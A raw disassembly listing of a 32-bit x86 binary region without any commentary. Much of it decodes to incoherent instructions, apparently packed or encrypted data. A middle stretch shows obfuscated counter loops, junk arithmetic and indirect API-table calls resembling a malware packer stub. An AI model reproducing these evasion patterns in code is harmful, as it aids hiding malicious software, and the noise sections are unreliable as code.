  413140:	dec    ebx
  413141:	cli    
  413142:	adc    eax,ebx
  413144:	or     DWORD PTR [eax-0x23],esi
  413147:	shr    BYTE PTR [eax],0x9f
  41314a:	add    BYTE PTR [ebp+0x510e541],dl
  413150:	dec    eax
  413151:	int3   
  413152:	adc    eax,0xff032df7
  413157:	nop
  413158:	cld    
  413159:	fadd   st,st(3)
  41315b:	fist   WORD PTR ds:0x318203e
  413161:	out    0x25,al
  413163:	jne    0x41312e
  413165:	xchg   esp,eax
  413166:	mov    cl,0x83
  413168:	ret    0x5509
  41316b:	xchg   edi,eax
  41316c:	aad    0xc8
  41316e:	jmp    0x3031:0xc87585f8
  413175:	push   ecx
  413176:	addr16 dec ebx
  413178:	pusha  
  413179:	js     0x413195
  41317b:	jb     0x41311c
  41317d:	xchg   edx,eax
  41317e:	cmp    ecx,ecx
  413180:	dec    edi
  413181:	jno    0x413108
  413183:	pop    es
  413184:	jae    0x41312e
  413186:	lock dec eax
  413188:	add    ch,bh
  41318a:	loope  0x4131b9
  41318c:	call   0x883a709
  413191:	test   DWORD PTR [ebp-0x1a4c9207],esp
  413197:	jmp    0x413147
  413199:	xor    cl,ch
  41319b:	dec    esp
  41319c:	sub    cl,dh
  41319e:	or     DWORD PTR [esi+0x4d],edi
  4131a1:	jmp    0x413135
  4131a3:	outs   dx,DWORD PTR ds:[esi]
  4131a4:	xor    eax,0xeb59010d
  4131a9:	not    DWORD PTR [ebx]
  4131ab:	inc    esp
  4131ac:	loopne 0x41312f
  4131ae:	jnp    0x413206
  4131b0:	jo     0x413227
  4131b2:	mov    WORD PTR [ebp-0x62912063],ss
  4131b8:	int    0x1f
  4131ba:	mov    ch,0x10
  4131bc:	dec    ecx
  4131bd:	ror    DWORD PTR [edi+0x4c6d12a5],1
  4131c3:	push   ds
  4131c4:	push   ebp
  4131c5:	ins    BYTE PTR es:[edi],dx
  4131c6:	call   0xa36627ae
  4131cb:	fstp   DWORD PTR [edx+0x40cfe25b]
  4131d1:	pop    es
  4131d2:	jmp    0x2cf1:0xaeacb16a
  4131d9:	dec    ebp
  4131da:	add    eax,0x2a632d80
  4131df:	cmc    
  4131e0:	cld    
  4131e1:	adc    ebx,esp
  4131e3:	sub    ah,BYTE PTR [eax]
  4131e5:	inc    edx
  4131e6:	sbb    esi,ecx
  4131e8:	or     al,0x80
  4131ea:	and    esi,DWORD PTR [edi-0x5a]
  4131ed:	daa    
  4131ee:	jns    0x41319a
  4131f0:	fstp   DWORD PTR [ecx+0x51]
  4131f3:	repz adc bh,ah
  4131f6:	sbb    DWORD PTR [edx],edi
  4131f8:	nop
  4131f9:	push   ebx
  4131fa:	xlat   BYTE PTR ds:[ebx]
  4131fb:	cmp    dh,bh
  4131fd:	into   
  4131fe:	inc    eax
  4131ff:	fisttp DWORD PTR [edx]
  413201:	div    ebx
  413203:	iret   
  413204:	and    BYTE PTR [esi+esi*4-0x6f5d8bcb],dl
  41320b:	xor    BYTE PTR ds:0x5d8812ef,al
  413211:	mov    ?,WORD PTR [ecx+0xf]
  413214:	and    ch,al
  413216:	mov    DWORD PTR [edi],esp
  413218:	pop    esp
  413219:	sti    
  41321a:	les    ebx,FWORD PTR [edx-0x2b]
  41321d:	pop    edi
  41321e:	push   0x2e
  413220:	sub    eax,0x3f2fd645
  413225:	adc    BYTE PTR [ecx+0x21],bl
  413228:	sbb    eax,0x71879398
  41322d:	inc    ecx
  41322e:	punpckldq mm4,DWORD PTR [ecx-0x6db1bc40]
  413235:	imul   esi,DWORD PTR [ebp+0x41],0xffffffd1
  413239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41323a:	dec    eax
  41323b:	mov    bh,0x16
  41323d:	cmp    al,0xb3
  41323f:	ss cli 
  413241:	popf   
  413242:	mov    eax,ds:0x845abe29
  413247:	adc    BYTE PTR [esi-0x5c],al
  41324a:	fsubr  QWORD PTR [ecx-0x7a]
  41324d:	js     0x413203
  41324f:	sub    eax,0xc2598a1b
  413254:	xchg   esp,eax
  413255:	fiadd  WORD PTR [eax+0x33ed4f2c]
  41325b:	data16 xor cl,BYTE PTR [ecx]
  41325e:	dec    ebp
  41325f:	ins    DWORD PTR es:[edi],dx
  413260:	loope  0x41328c
  413262:	cmp    BYTE PTR ds:0x7166f2c0,al
  413268:	pop    ecx
  413269:	pop    ss
  41326a:	mov    esp,0x2a7a8993
  41326f:	scas   al,BYTE PTR es:[edi]
  413270:	inc    ebx
  413271:	fsubr  QWORD PTR [edi-0x37]
  413274:	ficomp DWORD PTR [edx+0x7c5a2d9b]
  41327a:	cdq    
  41327b:	repnz mov cl,0x66
  41327e:	or     BYTE PTR [edi+0xc31066d],0x32
  413285:	jmp    0xb2cf:0xabc0fcd4
  41328c:	xchg   BYTE PTR [edi+0x32],ah
  41328f:	fadd   QWORD PTR [edi]
  413291:	mov    al,ds:0xad272d83
  413296:	push   ecx
  413297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413298:	in     eax,dx
  413299:	lds    eax,FWORD PTR [ebx-0x5]
  41329c:	sub    BYTE PTR [edx-0x7aa0d390],0xcc
  4132a3:	mov    esi,0xc8436a91
  4132a8:	adc    eax,0x32403ada
  4132ad:	out    0xab,al
  4132af:	add    BYTE PTR [esi-0x2046b3ef],ah
  4132b5:	jmp    0x413322
  4132b7:	xchg   edi,eax
  4132b8:	jae    0x4132ae
  4132ba:	mov    ds:0x4c832957,eax
  4132bf:	daa    
  4132c0:	mov    edx,0x60a2d8a9
  4132c5:	push   cs
  4132c6:	inc    esi
  4132c7:	adc    al,0x9a
  4132c9:	loope  0x4132b1
  4132cb:	ucomiss xmm2,DWORD PTR [ebp-0x427a2e23]
  4132d2:	push   esi
  4132d3:	push   0x62
  4132d5:	jecxz  0x413272
  4132d7:	cmp    dl,ch
  4132d9:	(bad)  
  4132da:	mov    ds:0xd59d97a4,eax
  4132df:	out    dx,eax
  4132e0:	lods   al,BYTE PTR ds:[esi]
  4132e1:	jmp    0x6a5f2ae6
  4132e6:	jecxz  0x4132ab
  4132e8:	dec    edi
  4132e9:	ins    DWORD PTR es:[edi],dx
  4132ea:	mov    dl,0x35
  4132ec:	and    dl,BYTE PTR [esi+0x5c]
  4132ef:	dec    edx
  4132f0:	mov    ebp,0x4d091b66
  4132f5:	leave  
  4132f6:	cmc    
  4132f7:	and    al,0xd0
  4132f9:	mov    ecx,0x3a727dd7
  4132fe:	or     al,BYTE PTR [eax-0x80]
  413301:	inc    eax
  413302:	inc    ebx
  413303:	xor    ecx,0x27
  413306:	xor    BYTE PTR [eax+edx*1],bl
  413309:	scas   al,BYTE PTR es:[edi]
  41330a:	lods   eax,DWORD PTR ds:[esi]
  41330b:	pop    ecx
  41330c:	imul   edi,esp,0xffffff9c
  41330f:	cs aas 
  413311:	sub    ah,BYTE PTR ds:0xea992930
  413317:	adc    BYTE PTR [edi-0x6ff7899e],al
  41331d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41331e:	dec    edi
  41331f:	je     0x413347
  413321:	pop    eax
  413322:	(bad)  
  413323:	aad    0x5d
  413325:	fxch   st(6)
  413327:	retf   0xbdee
  41332a:	sub    bl,bh
  41332c:	and    BYTE PTR [edi],bh
  41332e:	(bad)  
  41332f:	jae    0x4133ac
  413331:	std    
  413332:	jae    0x413318
  413334:	push   es
  413335:	aaa    
  413336:	dec    esi
  413337:	push   ds
  413338:	sub    al,0x89
  41333a:	cmp    bl,bh
  41333c:	fisttp QWORD PTR [ecx-0x71fa38f6]
  413342:	push   cs
  413343:	inc    edx
  413344:	add    BYTE PTR [esi],dl
  413346:	add    BYTE PTR [eax],al
  413348:	add    BYTE PTR [ebx+0x420e8e3d],al
  41334e:	add    BYTE PTR [eax],al
  413350:	je     0x4133a5
  413356:	cmp    DWORD PTR ds:0x420e8e,0x2
  41335d:	jne    0x413373
  413363:	push   0x4d61
  413368:	push   0x424000
  41336d:	call   DWORD PTR ds:0x4247fd
  413373:	cmp    DWORD PTR ds:0x420e8e,0x3
  41337a:	jne    0x41338d
  413380:	mov    ecx,DWORD PTR ds:0x420e8e
  413386:	dec    ecx
  413387:	mov    DWORD PTR ds:0x420e8e,ecx
  41338d:	mov    ecx,DWORD PTR ds:0x420e8e
  413393:	dec    ecx
  413394:	mov    DWORD PTR ds:0x420e8e,ecx
  41339a:	jmp    0x413349
  41339f:	sbb    ecx,0x253c
  4133a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4133a8:	and    DWORD PTR ds:0x42201c,0x420efc
  4133b2:	xor    ecx,eax
  4133b4:	adc    DWORD PTR ds:0x420f70,0x420ef8
  4133be:	add    ecx,esi
  4133c0:	mov    DWORD PTR [ebp-0x20],ecx
  4133c3:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  4133ca:	mov    ecx,DWORD PTR ds:0x420eec
  4133d0:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4133d7:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  4133de:	mov    ecx,0x748f
  4133e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4133e6:	mov    DWORD PTR [ebp+0x8],ecx
  4133e9:	mov    DWORD PTR ds:0x420f68,0x5b27
  4133f3:	jmp    0x413647
  4133f8:	xor    DWORD PTR ds:0x422008,edx
  4133fe:	mov    ecx,DWORD PTR [ebp+0x8]
  413401:	sub    DWORD PTR ds:0x420fa8,0x420ef8
  41340b:	mov    edx,DWORD PTR [ebp-0x8]
  41340e:	sub    DWORD PTR ds:0x420e86,0x420f98
  413418:	xor    ecx,eax
  41341a:	sbb    DWORD PTR ds:0x420f60,0x61d9
  413424:	xor    edx,eax
  413426:	xor    DWORD PTR ds:0x420f04,0x2d2e
  413430:	sub    ecx,edx
  413432:	sub    ecx,esi
  413434:	xor    ecx,eax
  413436:	and    DWORD PTR ds:0x420e9e,0x0
  413440:	mov    edx,DWORD PTR ds:0x420e9e
  413446:	inc    edx
  413447:	mov    DWORD PTR ds:0x420e9e,edx
  41344d:	cmp    DWORD PTR ds:0x420e9e,0x5
  413454:	jne    0x41346d
  41345a:	push   0x4241e6
  41345f:	push   0x1
  413461:	push   DWORD PTR [ebp-0x10]
  413464:	push   DWORD PTR [ebp-0x28]
  413467:	call   DWORD PTR ds:0x424801
  41346d:	cmp    DWORD PTR ds:0x420e9e,0x4
  413474:	jne    0x413487
  41347a:	mov    edx,DWORD PTR ds:0x420e9e
  413480:	inc    edx
  413481:	mov    DWORD PTR ds:0x420e9e,edx
  413487:	cmp    DWORD PTR ds:0x420e9e,0x18
  41348e:	jb     0x413440
  413494:	mov    DWORD PTR [ebp+0x8],ecx
  413497:	dec    edx
  413498:	mov    ecx,DWORD PTR [ebp+0x8]
  41349b:	add    edx,DWORD PTR ds:0x420e92
  4134a1:	mov    edx,DWORD PTR [ebp-0x64]
  4134a4:	add    DWORD PTR ds:0x420fa8,0x502e
  4134ae:	lea    ecx,[edx+ecx*1+0x5708f2]
  4134b5:	and    DWORD PTR ds:0x420f64,0x0
  4134bf:	mov    edx,DWORD PTR ds:0x420f64
  4134c5:	inc    edx
  4134c6:	mov    DWORD PTR ds:0x420f64,edx
  4134cc:	cmp    DWORD PTR ds:0x420f64,0x1a
  4134d3:	jne    0x4134e7
  4134d9:	push   0x420f04
  4134de:	push   DWORD PTR [ebp-0x24]
  4134e1:	call   DWORD PTR ds:0x424805
  4134e7:	cmp    DWORD PTR ds:0x420f64,0x15
  4134ee:	jb     0x4134bf
  4134f4:	or     DWORD PTR ds:0x422008,0x1488
  4134fe:	mov    DWORD PTR [ebp-0x64],ecx
  413501:	mov    ecx,DWORD PTR [ebp+0x8]
  413504:	mov    edx,DWORD PTR [ebp-0x60]
  413507:	lea    ecx,[edx+ecx*1+0x5708f2]
  41350e:	mov    DWORD PTR [ebp-0x60],ecx
  413511:	mov    ecx,DWORD PTR [ebp+0x8]
  413514:	mov    edx,DWORD PTR ds:0x422000
  41351a:	adc    DWORD PTR ds:0x420fa4,edx
  413520:	mov    edx,DWORD PTR [ebp-0x5c]
  413523:	sbb    DWORD PTR ds:0x420fa4,0x6605
  41352d:	lea    ecx,[edx+ecx*1+0x5708f3]
  413534:	and    DWORD PTR ds:0x420f5c,0x0
  41353e:	jmp    0x413552
  413543:	xor    edx,edx
  413545:	xor    edx,DWORD PTR ds:0x420f5c
  41354b:	inc    edx
  41354c:	mov    DWORD PTR ds:0x420f5c,edx
  413552:	cmp    DWORD PTR ds:0x420f5c,0x13
  413559:	jae    0x4135ab
  41355f:	cmp    DWORD PTR ds:0x420f5c,0x5
  413566:	jne    0x41358a
  41356c:	push   DWORD PTR [ebp-0x20]
  41356f:	push   0x420f04
  413574:	push   DWORD PTR [ebp-0x20]
  413577:	push   0x4240b9
  41357c:	push   0x1238
  413581:	push   DWORD PTR [ebp-0xc]
  413584:	call   DWORD PTR ds:0x42480d
  41358a:	cmp    DWORD PTR ds:0x420f5c,0x4
  413591:	jne    0x4135a4
  413597:	mov    edx,DWORD PTR ds:0x420f5c
  41359d:	inc    edx
  41359e:	mov    DWORD PTR ds:0x420f5c,edx
  4135a4:	jmp    0x413543
  4135a9:	neg    edx
  4135ab:	mov    DWORD PTR [ebp-0x5c],ecx
  4135ae:	and    DWORD PTR ds:0x420fa4,0x0
  4135b8:	mov    edx,DWORD PTR ds:0x420fa4
  4135be:	inc    edx
  4135bf:	mov    DWORD PTR ds:0x420fa4,edx
  4135c5:	cmp    DWORD PTR ds:0x420fa4,0x20
  4135cc:	jne    0x4135d8
  4135d2:	call   DWORD PTR ds:0x424811
  4135d8:	cmp    DWORD PTR ds:0x420fa4,0x18
  4135df:	jb     0x4135b8
  4135e5:	adc    edx,0x1b19
  4135eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4135ee:	mov    edx,DWORD PTR [ebp-0x58]
  4135f1:	lea    ecx,[edx+ecx*1+0x5708f0]
  4135f8:	xor    edx,DWORD PTR ds:0x420f08
  4135fe:	mov    DWORD PTR [ebp-0x58],ecx
  413601:	mov    ecx,DWORD PTR [ebp+0x8]
  413604:	xor    DWORD PTR ds:0x420f64,0x420eec
  41360e:	mov    edx,DWORD PTR [ebp-0x54]
  413611:	lea    ecx,[edx+ecx*1+0x5708f1]
  413618:	add    DWORD PTR ds:0x420f08,ebx
  41361e:	mov    DWORD PTR [ebp-0x54],ecx
  413621:	or     ecx,DWORD PTR ds:0x422018
  413627:	mov    ecx,DWORD PTR [ebp+0x8]
  41362a:	mov    edx,DWORD PTR [ebp-0x50]
  41362d:	inc    DWORD PTR ds:0x420f00
  413633:	lea    ecx,[edx+ecx*1+0x5708fe]
  41363a:	and    DWORD PTR ds:0x420e9a,0x420f6c
  413644:	mov    DWORD PTR [ebp-0x50],ecx
  413647:	inc    ecx
  413648:	mov    ecx,DWORD PTR [ebp+0x8]
  41364b:	adc    DWORD PTR ds:0x420ea2,0x68a
  413655:	xor    ecx,eax
  413657:	and    DWORD PTR ds:0x420e8e,0x1a66
  413661:	add    ecx,esi
  413663:	mov    DWORD PTR ds:0x420e92,0x4bef
  41366d:	jne    0x4133f8
  413673:	jmp    0x420dd1
  413678:	mov    ecx,DWORD PTR [ebp-0x1c]
  41367b:	mov    edx,DWORD PTR ds:0x423008
  413681:	mov    edx,DWORD PTR [edx]
  413683:	sub    DWORD PTR ds:0x420fb4,edx
  413689:	mov    edx,DWORD PTR [ebp-0x8]
  41368c:	xor    DWORD PTR ds:0x420f04,0x3196
  413696:	xor    ecx,eax
  413698:	xor    edx,eax
  41369a:	sbb    DWORD PTR ds:0x422000,0x24d3
  4136a4:	sub    ecx,edx
  4136a6:	xor    DWORD PTR ds:0x420e82,0x420e8a
  4136b0:	sub    ecx,esi
  4136b2:	xor    ecx,eax
  4136b4:	mov    DWORD PTR [ebp-0x1c],ecx
  4136b7:	mov    ecx,DWORD PTR [ebp-0xc]
  4136ba:	mov    DWORD PTR [ebp+0x8],ecx
  4136bd:	jmp    0x4136ef
  4136c2:	mov    ecx,DWORD PTR [ebp+0x8]
  4136c5:	mov    edx,DWORD PTR [ebp-0x8]
  4136c8:	xor    ecx,eax
  4136ca:	xor    edx,eax
  4136cc:	sub    ecx,edx
  4136ce:	sub    ecx,esi
  4136d0:	xor    ecx,eax
  4136d2:	mov    DWORD PTR [ebp+0x8],ecx
  4136d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4136d8:	mov    edx,DWORD PTR [ebp+0x8]
  4136db:	imul   edx,edx,0x5708f2
  4136e1:	xor    ecx,eax
  4136e3:	add    ecx,esi
  4136e5:	lea    ecx,[ebp+ecx*4-0x64]
  4136e9:	mov    edi,DWORD PTR [ecx]
  4136eb:	add    edx,edi
  4136ed:	mov    DWORD PTR [ecx],edx
  4136ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4136f2:	xor    ecx,eax
  4136f4:	jmp    0x415a81
  4136f9:	js     0x4136a4
  4136fb:	inc    edx
  4136fc:	iret   
  4136fd:	aaa    
  4136fe:	jae    0x41377b
  413700:	test   eax,0x7e5a8e7d
  413705:	outs   dx,DWORD PTR ds:[esi]
  413706:	fld    DWORD PTR ds:0x7a73beea
  41370c:	jp     0x413718
  41370e:	pop    edi
  41370f:	jp     0x41378b
  413711:	addr16 sti 
  413713:	ds aam 0x51
  413716:	or     esp,DWORD PTR [esi-0x2aa669ae]
  41371c:	fbld   TBYTE PTR [esi-0x4d]
  41371f:	in     eax,dx
  413720:	aaa    
  413721:	pop    ecx
  413722:	xlat   BYTE PTR ds:[ebx]
  413723:	loop   0x4136e8
  413725:	pop    ss
  413726:	and    al,0x99
  413728:	neg    DWORD PTR [edx]
  41372a:	pop    ebx
  41372b:	push   cs
  41372c:	add    eax,0xee0a7d24
  413731:	mov    ch,0x2e
  413733:	ds nop
  413735:	(bad)  
  413737:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413738:	gs cmc 
  41373a:	leave  
  41373b:	pop    esp
  41373c:	(bad)  
  41373d:	fimul  DWORD PTR [ebp-0x49]
  413740:	jnp    0x4137b1
  413742:	sbb    BYTE PTR [ebp+0x354c8af1],0xe2
  413749:	lea    ecx,[ebx-0x7e]
  41374c:	inc    esp
  41374d:	push   ss
  41374e:	dec    eax
  41374f:	xchg   esp,eax
  413750:	pusha  
  413751:	xor    al,0xe6
  413753:	inc    eax
  413754:	pop    eax
  413755:	pop    esi
  413756:	push   esi
  413757:	scas   al,BYTE PTR es:[edi]
  413758:	cwde   
  413759:	dec    ebx
  41375b:	mov    ebx,0xa5735e7
  413760:	dec    edx
  413761:	sub    bh,ch
  413763:	pop    ebx
  413764:	mov    cl,BYTE PTR [esi-0x72]
  413767:	or     ecx,DWORD PTR [esi*1+0x2ce62fa3]
  41376e:	sti    
  41376f:	adc    al,0xe8
  413771:	push   ebp
  413772:	mov    cx,0x2e14
  413776:	clc    
  413777:	sahf   
  413778:	mov    DWORD PTR [edx+0x579b1d8c],eax
  41377e:	xor    BYTE PTR [eax-0x5bcb1c13],0x1b
  413785:	cmp    dh,BYTE PTR [edi+0x973e8f9]
  41378b:	xchg   ch,cl
  41378d:	sbb    ecx,edi
  41378f:	ins    BYTE PTR es:[edi],dx
  413790:	test   al,dh
  413792:	jmp    0x8475:0x3255abdb
  413799:	ins    DWORD PTR es:[edi],dx
  41379a:	loopne 0x4137d0
  41379c:	mov    ebx,0x76d13a9d
  4137a1:	jecxz  0x41373a
  4137a3:	mov    ebx,0x680e627c
  4137a8:	xchg   ebx,eax
  4137a9:	adc    al,0x78
  4137ab:	and    al,dl
  4137ad:	scas   al,BYTE PTR es:[edi]
  4137ae:	push   esp
  4137af:	push   eax
  4137b0:	les    eax,FWORD PTR [edi]
  4137b2:	ret    0x94e5
  4137b5:	fist   WORD PTR [edx+esi*4-0x42d1de88]
  4137bc:	dec    eax
  4137bd:	test   BYTE PTR [ebx-0x6e053607],al
  4137c3:	inc    esi
  4137c4:	loopne 0x4137dd
  4137c6:	add    eax,0x314c9d42
  4137cb:	mov    esp,0xda003e54
  4137d0:	idiv   DWORD PTR [ecx-0x30]
  4137d3:	cmp    eax,0xb2fa4f84
  4137d8:	add    BYTE PTR ds:0xc75674df,dl
  4137de:	push   es
  4137df:	dec    edx
  4137e0:	ja     0x4137ad
  4137e2:	pop    esp
  4137e3:	mov    cl,0x5a
  4137e5:	scas   eax,DWORD PTR es:[edi]
  4137e6:	out    dx,al
  4137e7:	adc    DWORD PTR [ebx+esi*1],edi
  4137ea:	mov    ebp,0x29b22842
  4137ef:	aam    0x49
  4137f1:	shl    edx,1
  4137f3:	xchg   edx,eax
  4137f4:	push   0x8c53457f
  4137f9:	and    DWORD PTR [edi+0x4fa4ed50],eax
  4137ff:	and    al,cl
  413801:	call   0x665db62a
  413806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413807:	pop    ss
  413808:	aam    0x17
  41380a:	cs gs jmp 0x413861
  41380e:	pop    ds
  41380f:	jo     0x41380d
  413811:	sbb    DWORD PTR [ecx],ecx
  413813:	cdq    
  413814:	stc    
  413815:	add    ebx,esi
  413817:	inc    edi
  413818:	sbb    dh,ah
  41381a:	cdq    
  41381b:	sbb    al,0x93
  41381d:	scas   al,BYTE PTR es:[edi]
  41381e:	pop    esi
  41381f:	mov    al,0x5e
  413821:	xor    al,0x1b
  413823:	retf   0x7f6
  413826:	push   0x6
  413828:	lea    ecx,[ebx]
  41382a:	jns    0x4137ba
  41382c:	xchg   DWORD PTR [ecx],ebx
  41382e:	scas   al,BYTE PTR es:[edi]
  41382f:	aam    0x7a
  413831:	call   0xbc0b:0xd76f4c1a
  413838:	inc    esi
  413839:	push   es
  41383a:	push   es
  41383b:	call   0x89134ef9
  413840:	pop    ebp
  413841:	push   bx
  413843:	inc    edi
  413844:	imul   esp,DWORD PTR [edx],0xed8058d8
  41384a:	test   al,0xdb
  41384c:	int3   
  41384d:	inc    ecx
  41384e:	cld    
  41384f:	in     eax,dx
  413850:	jmp    DWORD PTR [ecx+0x2c]
  413853:	and    al,0x23
  413855:	fwait
  413856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413857:	and    dh,0x72
  41385a:	jmp    FWORD PTR cs:[eax+0x6a752f6]
  413861:	sahf   
  413862:	sahf   
  413863:	jle    0x4138a8
  413865:	shl    BYTE PTR [eax],cl
  413867:	nop
  413868:	aad    0xa5
  41386a:	test   al,0x77
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	push   eax
  41386e:	and    BYTE PTR [ecx],al
  413870:	xchg   ebp,eax
  413871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413872:	sub    BYTE PTR [ecx-0x43],bh
  413875:	sub    ch,BYTE PTR [edx+ecx*4]
  413878:	scas   al,BYTE PTR es:[edi]
  413879:	call   0x57904341
  41387e:	and    ebp,esp
  413880:	mov    al,ds:0x4c48334f
  413885:	adc    DWORD PTR ds:0xfe3dffb9,0x9349f5fc
  41388f:	jecxz  0x413836
  413891:	adc    BYTE PTR [edx],al
  413893:	push   ebx
  413894:	imul   eax,ecx,0x9170c2ef
  41389a:	or     ch,bl
  41389c:	nop
  41389d:	cmovbe esi,DWORD PTR [eax+0x2432d0e6]
  4138a4:	dec    esi
  4138a5:	mov    al,ds:0x17771af1
  4138aa:	push   ds
  4138ab:	repz pusha 
  4138ad:	add    eax,edi
  4138af:	ja     0x41385e
  4138b1:	push   eax
  4138b2:	bound  edx,QWORD PTR cs:[eax+0x3b]
  4138b6:	(bad)  
  4138b7:	jmp    0xfd54:0xbb59fcfb
  4138be:	jmp    0xad9743cb
  4138c3:	cs leave 
  4138c5:	xchg   ecx,eax
  4138c6:	mov    eax,0xd7625564
  4138cb:	enter  0x6566,0x10
  4138cf:	pop    edx
  4138d0:	test   eax,0x947285d2
  4138d5:	(bad)  
  4138d6:	jnp    0x4138cd
  4138d8:	mov    ch,0x3e
  4138da:	jbe    0x413876
  4138dc:	test   DWORD PTR [edx+0x26499de0],ecx
  4138e2:	inc    esp
  4138e3:	pop    edi
  4138e4:	inc    ebp
  4138e5:	xchg   esp,eax
  4138e6:	rcl    edi,0xa8
  4138e9:	xchg   ebx,eax
  4138ea:	or     DWORD PTR [ecx+0x42474732],0xffffffeb
  4138f1:	jmp    0x3452:0xde2841e5
  4138f8:	cmp    ebx,DWORD PTR [eax+0x77]
  4138fb:	jo     0x41388b
  4138fd:	aaa    
  4138fe:	sub    BYTE PTR [ebp+eax*4-0x2b],0x80
  413903:	add    eax,0xac2d017d
  413908:	mov    dh,0xc3
  41390a:	test   DWORD PTR [ebp+0x1f51682a],0x2a57246b
  413914:	pop    ebx
  413915:	iret   
  413916:	shr    BYTE PTR [edx-0x7d],1
  413919:	cwde   
  41391a:	dec    esp
  41391b:	adc    DWORD PTR [ecx-0x20],edx
  41391e:	pop    edi
  41391f:	outs   dx,DWORD PTR ds:[esi]
  413920:	xchg   ah,al
  413922:	sbb    eax,0xb0cbd187
  413927:	outs   dx,BYTE PTR ds:[esi]
  413928:	das    
  413929:	inc    edi
  41392a:	push   DWORD PTR [edx-0x6a]
  41392d:	fld    TBYTE PTR [eax+0x52e8869b]
  413933:	arpl   bx,sp
  413935:	cmp    al,0xf
  413937:	pop    esi
  413938:	mov    ebx,0x5a8c7e33
  41393d:	test   BYTE PTR [ecx+eiz*8],al
  413940:	sub    al,0xe8
  413942:	cs ins BYTE PTR es:[edi],dx
  413944:	cmp    edx,DWORD PTR [edi+eax*8+0x450a2779]
  41394b:	jmp    0x1a2473f2
  413950:	fld    QWORD PTR [edx+0x25]
  413953:	push   edx
  413954:	push   ebx
  413955:	cwde   
  413956:	push   cs
  413957:	mov    ebx,0xc810333b
  41395c:	adc    BYTE PTR ds:0x812790f9,0x72
  413963:	loop   0x41396c
  413965:	mov    ebp,0xd298f480
  41396a:	mov    dl,0xe
  41396c:	mov    eax,0x871d6a1e
  413971:	lods   eax,DWORD PTR ds:[esi]
  413972:	adc    al,0xd
  413974:	cli    
  413975:	shl    ecx,0x3e
  413978:	fcomip st,st(7)
  41397a:	cmp    ecx,edi
  41397c:	pop    esp
  41397d:	enter  0xdcc,0x87
  413981:	dec    ebp
  413982:	les    esi,FWORD PTR [eax-0x2f]
  413985:	repnz adc DWORD PTR [ecx],eax
  413988:	xor    DWORD PTR [ecx+0x4f34076f],esi
  41398e:	inc    esi
  41398f:	inc    edx
  413990:	jnp    0x413999
  413992:	push   dx
  413994:	(bad)  
  413995:	(bad)  
  413996:	jnp    0x4139d8
  413998:	cmp    DWORD PTR [edi+0x17],edi
  41399b:	xchg   edx,eax
  41399d:	pop    es
  41399e:	mov    DWORD PTR [edx-0x7e],ebx
  4139a1:	mov    esi,0xf8a31f84
  4139a6:	fidivr DWORD PTR [esi+ecx*2]
  4139a9:	out    0x43,eax
  4139ab:	cmp    ecx,ebp
  4139ad:	mov    ecx,0xa404eb8c
  4139b2:	push   eax
  4139b3:	scas   eax,DWORD PTR es:[edi]
  4139b4:	and    dl,BYTE PTR [edi-0x77e74752]
  4139ba:	dec    edx
  4139bb:	xor    eax,0x5d61156
  4139c0:	push   ecx
  4139c1:	mov    fs,esp
  4139c3:	jle    0x413978
  4139c5:	fs out dx,al
  4139c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139c8:	lods   eax,DWORD PTR ds:[esi]
  4139c9:	icebp  
  4139ca:	dec    esi
  4139cb:	mov    dh,0x92
  4139cd:	cdq    
  4139ce:	out    dx,eax
  4139cf:	sbb    BYTE PTR [ebp+0x16],bh
  4139d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139d3:	inc    ebx
  4139d4:	or     eax,0xf91b605d
  4139d9:	imul   eax,DWORD PTR [edi+ebx*2],0x999f1edc
  4139e0:	mov    dh,0x31
  4139e2:	inc    ebp
  4139e3:	fwait
  4139e4:	imul   esp,esi,0x7e
  4139e7:	mov    edi,0xbe9c3dce
  4139ec:	mov    al,ds:0xef679510
  4139f1:	aaa    
  4139f2:	add    al,0xb4
  4139f4:	pop    es
  4139f5:	call   0x44e0:0x38c29c0
  4139fc:	gs push ebp
  4139fe:	fldenv ds:0xf96582f2
  413a04:	jg     0x413a2d
  413a06:	mov    DWORD PTR [ebp+ebp*4-0x7a],esp
  413a0a:	sub    BYTE PTR [eax-0x3d7adb38],0xa
  413a11:	push   edi
  413a12:	retf   0x4074
  413a15:	or     eax,0xab4b846
  413a1a:	mov    al,0x2b
  413a1c:	outs   dx,BYTE PTR ds:[esi]
  413a1d:	pusha  
  413a1e:	jl     0x413a70
  413a20:	add    BYTE PTR [esi-0x7b819545],dh
  413a26:	cmp    ebp,ecx
  413a28:	sbb    eax,DWORD PTR ds:0x3c243786
  413a2e:	sub    bl,BYTE PTR [ebp-0x62b0f104]
  413a34:	pop    es
  413a35:	cmp    al,0x47
  413a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a38:	jne    0x413a4b
  413a3a:	adc    edi,DWORD PTR [eax]
  413a3c:	ja     0x413aaa
  413a3e:	push   ds
  413a3f:	stos   DWORD PTR es:[edi],eax
  413a40:	cmp    edi,DWORD PTR [esi+0x5978dee9]
  413a46:	dec    edx
  413a47:	or     al,0x1c
  413a49:	inc    esi
  413a4a:	jb     0x413a6e
  413a4c:	ffree  st(3)
  413a4e:	shr    ebp,cl
  413a50:	or     ch,BYTE PTR [ebp-0x6b]
  413a53:	cmp    esi,ebp
  413a55:	inc    esp
  413a56:	xlat   BYTE PTR ds:[ebx]
  413a57:	inc    esp
  413a58:	fistp  WORD PTR [esi+0x54]
  413a5b:	push   cs
  413a5c:	xor    eax,0x4001f3c9
  413a61:	xor    edi,esp
  413a63:	clc    
  413a64:	sub    DWORD PTR [eax-0x41143a87],ebx
  413a6a:	push   ss
